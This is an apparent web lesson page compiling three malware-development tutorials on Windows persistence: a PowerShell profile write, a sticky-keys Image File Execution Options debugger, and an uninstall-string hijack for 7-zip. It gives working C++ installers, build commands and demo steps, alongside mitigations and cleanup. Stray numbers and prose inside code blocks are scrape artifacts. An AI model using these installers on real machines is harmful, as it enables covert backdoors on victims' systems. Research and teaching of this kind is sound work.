@@ -1,0 +1,340 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 11. Powershell profile.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #36</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 11. Powershell profile.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into one of the interesting malware persistence trick: via powershell profile. powershell profile A PowerShell profile is a powershell script that allows system administrators and end users to configure their environment and perform specified commands when a Windows PowerShell session begins. The PowerShell profile script is stored in the folder WindowsPowerShell:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s add the following code to a to the current user’s profile file, that will be performed whenever the infected user enters a powershell console: Z:\2022-09-20-malware-pers-11\hack.exe I will demonstrate everything with a practical example and you will understand everything.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Firstly, create our “malicious” file:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+evil app for windows
+persistence via powershell profile
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+As usually it is just “meow-meow” messagebox.
+Compile it:
+x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And we can run at victim machine for checking correctness:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then we do this simple “trick”: echo Z:\2022-09-20-malware-pers-11\hack.exe > "%HOMEPATH%\Documents\windowspowershell\profile.ps1" And finally, run powershell: powershell -executionpolicy bypass</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">681</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our malicious logic executed as expected and powershell is the parent process of our messagebox. =.. = I created a simple PoC code to automate this process:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via Powershell profile
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;strsafe.h&gt;
+#include &lt;iostream&gt;
+int main(int argc, char* argv[]) {
+char path[MAX_PATH];
+char *homepath = getenv("USERPROFILE");
+char pspath[] = "\\Documents\\windowspowershell";
+char psprofile[] = "\\profile.ps1";
+
+char evil[] = "Z:\\2022-09-20-malware-pers-11\\hack.exe";
+DWORD evilLen = (DWORD)strlen(evil);
+StringCchCopy(path, MAX_PATH, homepath);
+StringCchCat(path, MAX_PATH, pspath);
+BOOL wd = CreateDirectoryA(path, NULL);
+if (wd == FALSE) {
+printf("unable to create dir: %s\n", path);
+} else {
+printf("successfully create dir: %s\n", path);
+}
+StringCchCat(path, MAX_PATH, psprofile);
+HANDLE hf = CreateFile(
+path,
+GENERIC_WRITE,
+0,
+NULL,
+CREATE_NEW,
+FILE_ATTRIBUTE_NORMAL,
+NULL
+);
+if (hf == INVALID_HANDLE_VALUE) {
+printf("unable to create file: %s\n", path);
+} else {
+printf("successfully create file: %s\n", path);
+}
+BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);
+if (wf == FALSE) {
+printf("unable to write to file %s\n", path);
+} else {
+printf("successfully write to file evil path: %s\n", evil);
+}
+CloseHandle(hf);
+return 0;
+}
+The logic is simple, this script just create profile folder if not exists, then create profile
+file and update it.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our PoC:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it on the victim’s machine: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And when powershell session is started:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we check it via Process Hacker:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">powershell.exe is the parent process again as expected. As you can see everything is worked perfectly! =.. = But there are the caveat. If powershell runned without execution policy bypass mode, this persistence trick not work in my case:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also there are four places you can abuse the powershell profile, depending on the privileges you have: $PROFILE | select *</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">By storing arbitrary instructions in the profile script, PowerShell profiles present several chances for code execution. To avoid relying on the user to start PowerShell, you may use a scheduled job that executes PowerShell at a certain time. mitigations Enforce execution of only signed PowerShell scripts. Sign profiles to avoid them from being modified. Also you can avoid PowerShell profiles if not needed, for example via -No-Profile flag. This persistence trick is used by Turla in the wild. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Microsoft PowerShell profiles MITRE ATT&CK. Event Triggered Execution: PowerShell Profile Turla source code on github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">78. malware development: persistence - part 12. Accessibility Features. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into another admin-level malware persistence trick: via Accessibility Features. In the one of the previous posts, I wrote about persistence via Image File Execution Options. In the one of the PoC examples, we just created a debugger to a victim process in this registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe then only requires the malicious application to be stored in System32.</p>
+
+            <div id="practical-example-sethc-exe" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example. sethc.exe</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today I just replace our victim process with sethc.exe. But what is sethc.exe? It appears it is responsible for sticky keys. Pressing the Shift key 5 times will enable the sticky keys:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Instead of the legitimate sethc.exe, “the rogue sethc.exe” , as usually for simplicity it is a meow messagebox, will be executed. The source code is pretty similar (pers.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via Accessibility Features
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// image file
+const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+File Execution Options\\sethc.exe";
+// evil app
+const char* exe = "C:\\Windows\\System32\\hack.exe";
+// Debugger
+LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+// Execution Options\sethc.exe" /v Debugger /d "hack.exe"
+RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe,
+strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+}
+Meow-meow messagebox:
+/*
+hack.cpp
+evil app for windows persistence
+via Accessibility Features
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Check registry keys before: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ Image File Execution Options" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, compile our pers.cpp: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run and check registry keys again: You need to have administrative privileges to replace the genuine Windows binary of the tool .\pers.exe reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, pressing Shift key 5 times:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Note to the properties of the hack.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Perfect! =.. = After end of experiments, for cleanup, run: Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force -Verbose</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The Windows Accessibility Features are a collection of utilities accessible via the Windows sign-in screen (like Sticky Keys). Some Accessibility features and their corresponding trigger choices and locations include:</p>
+
+            <div id="1-utility-manager" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>1. Utility Manager</span>
+                </h3>
+            </div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>C:\Windows\System32\Utilman.exe</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Trigger: Windows key + U</span></div></div>
+
+            <div id="2-on-screen-keyboard" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>2. On-Screen Keyboard</span>
+                </h3>
+            </div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>C:\Windows\System32\osk.exe</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Trigger: Click on On-screen keyboard button</span></div></div>
+
+            <div id="3-magnifier" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>3. Magnifier</span>
+                </h3>
+            </div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>C:\Windows\System32\Magnify.exe</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Trigger: Windows Key + =</span></div></div>
+
+            <div id="4-narrator" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>4. Narrator</span>
+                </h3>
+            </div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>C:\Windows\System32\Narrator.exe</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Trigger: Windows Key + Enter</span></div></div>
+
+            <div id="5-display-switcher" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>5. Display Switcher</span>
+                </h3>
+            </div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>C:\Windows\System32\DisplaySwitch.exe</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Trigger: Windows Key + P</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">These Windows capabilities became well-known when the APT groups exploited them to backdoor target PCs. For example, APT3, APT29 and APT41 used sticky keys.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. MITRE ATT&CK. Event Triggered Execution: Accessibility Features APT3 APT29 APT41 source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">79. malware development: persistence - part 13. Hijacking uninstall logic for application. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into one of the interesting malware persistence trick: via hijacking uninstall file for target application. uninstallation process When you install a program on a Windows system, they usually point to their own uninstallers. They are in the registry keys: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<application name> and HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\<application name> So what is the trick? There is no problem with replacing them with commands that can run any other program. When a user executes the uninstaller, the command of the attacker’s choosing is executed. Again, the good news is that privileges are required to modify these items, as they reside under the HKLM key.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s look at a practical example. Firstly, let’s choose a target application. I chose 7-zip x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">699</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, check registry key values, for correctness: reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also, I prepared my evil application. It’s as usually meow-meow “malware” :)</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, I create a program, which do my logic for persistence (pers.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via
+hijacking uninstall app
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/10/04/malware-pers-13.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// target app
+const char* app =
+"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";
+// evil app
+const char* exe =
+"C:\\Users\\User\\Documents\\malware\\2022-10-04-malware-pers-13\\hack.exe";
+// app
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// update registry key value
+// reg add
+
+//"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\
+// 7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
+RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)
+exe, strlen(exe));
+RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ,
+(unsigned char*)exe, strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the logic is simple, we are just update target key values in registry.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile malware and persistence script: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run at the victim’s machine - Windows 10 x64 in my case: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, after reboot my system, tried to uninstall 7-zip:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">704</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then I looked at the properties of hack.exe in Process Hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">as you can see the parent process is SystemSettings.exe - is what you see whenever you open your Windows settings. In our case, it is add/remove programs. Perfect! =.. = There are the little caveat. When I try to update key with path Z:\2022-10-04-malware-pers-13\hack.exe I get an error like this:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Maybe you can use only paths inside the disk C:\. After end of the experiments, clean up: reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /v "UninstallString" /t REG_SZ /d "C:\Program Files\7-zip\Uninstall.exe" /f</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Of course, maybe this trick is not so cool for persistence, since it requires the permissions and participation of the victim’s user. But why not? There is one more trick with using installing and removing programs for persistence, I will write about it in one of the future posts. I’m still in the process of investigating this possibility for the red team. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. RegOpenKeyEx RegSetValueEx RegCloseKey reg query source code in github</p></main></body></html>
